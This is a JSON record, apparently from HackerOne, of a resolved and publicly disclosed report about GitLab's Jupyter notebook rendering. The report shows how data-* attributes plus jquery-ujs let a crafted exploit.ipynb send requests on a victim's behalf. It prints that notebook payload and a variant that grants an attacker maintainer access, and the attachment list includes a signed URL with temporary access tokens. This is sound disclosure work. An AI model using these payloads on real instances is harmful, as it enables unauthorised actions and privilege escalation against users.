@@ -1,0 +1,140 @@
+{
+  "id": 970869,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NzA4Njk=",
+  "url": "https://hackerone.com/reports/970869",
+  "title": "Sending Arbitrary Requests through Jupyter Notebooks on gitlab.com and Self-Hosted GitLab Instances",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-30T18:14:35.191Z",
+  "submitted_at": "2020-08-30T18:14:35.262Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "iwis",
+    "url": "/iwis",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-02-10T14:46:45.898Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-02-09T23:51:30.777Z",
+  "team_member_agreed_on_going_public_at": "2022-02-10T14:46:45.684Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> *NOTE*: I am still researching whether there is a possibility to deploy the exploit without user interaction.\n\n### Summary\n\nGitLab provides a [rich representation](https://docs.gitlab.com/ee/user/project/repository/jupyter_notebooks/) for Jupyter Notebooks (`*.ipynb`). In turn, Jupyter Notebooks provide the possibility for [rich output via HTML](https://nbviewer.jupyter.org/github/ipython/ipython/blob/master/examples/IPython%20Kernel/Rich%20Output.ipynb#HTML). Although most tags and attributes are stripped from the HTML output rendered in GitLab's rich representation, it retains `data-*` attributes. Using [`jquery-ujs`](https://gitlab.com/gitlab-org/gitlab/-/blob/4e12f87c013f59070bf1156bb2427af9fa9123c4/package.json#L101) as a gadget, it is possible to trigger `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params). On https://gitlab.com, the CSP restricts the target, while there is no such limitation for self-hosted GitLab instances. As of now, this vulnerability requires user interaction in the form of a single click followed by and applies to https://gitlab.com as well as self-hosted GitLab instances.\n\n### Steps to reproduce\n\n1. Create a GitLab project or refer to an existing project.\n2. Upload an `exploit.ipynb` file with the following contents:\n\n     ```json\n    {\n      \"cells\": [\n        {\n          \"metadata\": { \"trusted\": true },\n          \"cell_type\": \"code\",\n          \"source\": \"Tell me something about you!\",\n          \"execution_count\": 1,\n          \"outputs\": [\n            {\n              \"output_type\": \"display_data\",\n              \"data\": {\n                \"text/plain\": \"<IPython.core.display.HTML object>\",\n                \"text/html\": \"What's your favorite color?&emsp;<select data-method=\\\"put\\\" data-params=\\\"message=p0wn3d\\\" data-remote=\\\"true\\\" data-url=\\\"/api/v4/user/status\\\"><option>Red</option><option>Green</option><option>Blue</option></select>\\n\"\n              },\n              \"metadata\": {}\n            }\n          ]\n        }\n      ],\n      \"metadata\": {\n        \"kernelspec\": {\n          \"name\": \"python3\",\n          \"display_name\": \"Python 3\",\n          \"language\": \"python\"\n        },\n        \"language_info\": {\n          \"name\": \"python\",\n          \"version\": \"3.7.8\",\n          \"mimetype\": \"text/x-python\",\n          \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },\n          \"pygments_lexer\": \"ipython3\",\n          \"nbconvert_exporter\": \"python\",\n          \"file_extension\": \".py\"\n        }\n      },\n      \"nbformat\": 4,\n      \"nbformat_minor\": 4\n    }\n    ```\nwhere `cells[0].outputs[0].data.text/html` contains the payload.\n3. In the *Files*  view of the project, click on the above-added `exploit.ipynb`.\n4. Select an option other than the default.\n5. Reload the page to recongize that your status has been altered, i.e. click on your profile in the top right corner.\n\n### Impact\n\nAn attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim.\n\nThe impact is similar to that of #824689 and #806571.\n\n### Examples\n\nDue to the destructive nature of the above-described example, I do not provide a public PoC, although I have created [an exemplary repository](https://gitlab.com/dpfuerst/sending-arbitrary-requests-through-jupyter-notebooks). This repository is private, please let me know if you would like me to change the visibility.\n\nThe above-described `exploit.ipynb` [sets the user status](https://docs.gitlab.com/ee/api/users.html#set-user-status) of the victim to `p0wn3d`. However, more critical permission-related exploits are also possible. Consider an attacker with developer access to a project who wants to gain maintainer access, instead. That attacker could upload an exploit like the above with the following payload:\n\n```html\nWhat's your favorite color?&emsp;<select data-method=\\\"put\\\" data-params=\\\"user_id=<ATTACKER_ID>&access_level=40\\\" data-remote=\\\"true\\\" data-url=\\\"/api/v4/projects/<PROJECT_ID>/members\\\"><option>Red</option><option>Green</option><option>Blue</option></select>\\n\n```\n\nwhere `<ATTACKER_ID>` is to be replaced with the attacker's user ID and `<PROJECT_ID>` is to be replaced with the target project's ID to [gain maintainer access](https://docs.gitlab.com/ee/api/members.html#edit-a-member-of-a-group-or-project).\n\n### What is the current *bug* behavior?\n\nThe provided `exploit.ipynb` renders to\n\n```html\nWhat's your favorite color? <select data-url=\"/api/v4/user/status\" data-remote=\"true\" data-params=\"message=p0wn3d\" data-method=\"put\"><option>Red</option><option>Green</option><option>Blue</option></select>\n```\n\n### What is the expected *correct* behavior?\n\nThe provided `exploit.ipynb` should render to\n\n```html\nWhat's your favorite color? <select><option>Red</option><option>Green</option><option>Blue</option></select>\n```\n\nThat is, `data-*` attributes should be stripped from GitLab's rich output. If the `data-*` attributes are necessary to provide another feature within the rich output, their appearance should be whitelisted, at least.\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n#### Results of GitLab environment info\n\n```\nSystem information                                                       \nSystem:         Ubuntu 16.04                                             \nProxy:          no                                                       \nCurrent User:   git                                                      \nUsing RVM:      no                                                       \nRuby Version:   2.6.6p146                                                \nGem Version:    2.7.10                                                   \nBundler Version:1.17.3                                                   \nRake Version:   12.3.3                                                   \nRedis Version:  5.0.9                                                    \nGit Version:    2.28.0                                                   \nSidekiq Version:5.2.9                                                    \nGo Version:     unknown                                                  \n                                                                         \nGitLab information                                                       \nVersion:        13.3.2-ee                                                \nRevision:       d4deaad1474                                              \nDirectory:      /opt/gitlab/embedded/service/gitlab-rails                \nDB Adapter:     PostgreSQL                                               \nDB Version:     11.7                                                     \nURL:            <REDACTED>\nHTTP Clone URL: <REDACTED>\nSSH Clone URL:  <REDACTED>\nElasticsearch:  no                                                       \nGeo:            no                                                       \nUsing LDAP:     no                                                       \nUsing Omniauth: yes                                                      \nOmniauth Providers:                                                      \n                                                                         \nGitLab Shell                                                             \nVersion:        13.6.0                                                   \nRepository storage paths:                                                \n- default:      /git/repositories                                        \nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\nGit:            /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nAn attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim. For example, using the GitLab API as a target, an attacker could gain maintainer access to a project, given that the victim is maintainer (or higher) themselves.\n\nThe impact is similar to that of #824689 and #806571.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 969699,
+      "file_name": "exploit.ipynb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e8SMMQpRt3bVhAdyPNjhtyJk?response-content-disposition=attachment%3B%20filename%3D%22exploit.ipynb%22%3B%20filename%2A%3DUTF-8%27%27exploit.ipynb&response-content-type=application%2Fx-ipynb%2Bjson&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEN6ZMX6%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T002902Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQDaPeTSLue%2BnrEQPFz%2BGFlOGBetmNIsUt4npGAtXrfntwIhAJQjhaKlYHqET5ebauD%2F36ivbCgvomtYsJw7jjns6wfxKroFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxATwEa%2Bklbzl1pOOIqjgWLiQYO1cLoMkYQ%2FM7yAqTtHBJPPMqU0kuJzwgknHMNizUjfFdnqf6%2F4%2BTnQnOKC%2Fg89XTHcDgjdpJ9MPoIUAHnmevlDSZ4v1PVq1z8b9OVPf1sabxVIJiNQn56qXcUrTfrXoxd97irBxCyfBrC6MiLJ8igFe3JyYHxdQnk%2BU0D8TTm6mOqNiOXFiDgwuSKAaBOuk3Ht5IJ3D%2B8kUFzgbGzhH4WUrPlS1bT%2FoHmfCEL%2FSD4J2UIakTNj%2FGh6SukadXYwvKp5wMfIkr%2FkpHTQ8zP8%2BBaig1ZBvZaRPguK2yNI1HV3hhx38Yh%2BfZp566I29M%2BFUGwCtXKOR6kdZlO75PfRNIcqGhASKKMFdqtT1KjpUg3%2BcvL0lZBTareGY85d34T5lfpgPgGddFv2SJcQvnar0ul1EizwSlqXvT9JVICE1PPs%2FD4DuPWN4dLIa23vyAgeiSmw5%2FLCaxzRc%2FI%2BdQx%2BVcT9sVN677w0I4iT6el8ejQwWsJOrYz4Yh5v5TURo4plIdAy%2BRHfLRg2gbiXGY25B7U8tqCaQ3Vw%2B6R%2BTcJYxS5qAoCPA6eNyhL%2F5ZOzO%2FB7K496u%2BNuulOEYIiNVZ29O2P4C5WENOYsIKZxQqJDwxrHFisMFXINDpZ1EsG%2FN9hz0vwxKj85imB8E8B1zMnY17p%2FvGWwXbIJ0fPND366nUU58FbsKBV68TN0weGkx2i7JW63jZrGDiBs%2B4boCPabrmUiXBgz3cm7CwlyzbIPAL61EsMoTlyc7R3uX4OcgnfziYAixio5ri4gepsLVRRA5bZ2fDgP72H3%2F0UFEbFmSbAWhftwPREqG9nRllckcJ6lxthBf667gza3ccj7YhcoamHFkmucZQWECgMskIwppS8xgY6sAHlIt3gAKrLVe%2B05z%2BrpCfEkWuJtsnsxqBFyPzPzkxEQMemcqp6TN3o6cr7J2KXWl2IO8lymLjoBaLimIW%2B4%2BZrocmXBGDlfHqYyxPCt926V5mmtaUJc2pRkg5hKPHAGa6JbP141KGENaG0dHy0g484U9%2F2%2Fb6FjxlONWFi0bhQEl%2Bw8ks8tpUSG%2FN8HTdx4JQufV9sQC1IP9nwkAjGUetG9LbIf8u5wx1DfNF53NgrlA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c013d68c73639f2b2c5edd4d33d653e324988dc52ad4abd246a6a5b029b8eb75",
+      "file_size": 1125,
+      "type": "application/x-ipynb+json",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 14,
+  "voters": [
+    "alp",
+    "thruster",
+    "ali",
+    "chupa-chups",
+    "akashhamal0x01",
+    "h4x0r_dz",
+    "ibring",
+    "f1ras",
+    "ranjith_mayan",
+    "damienhunter9",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.4,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
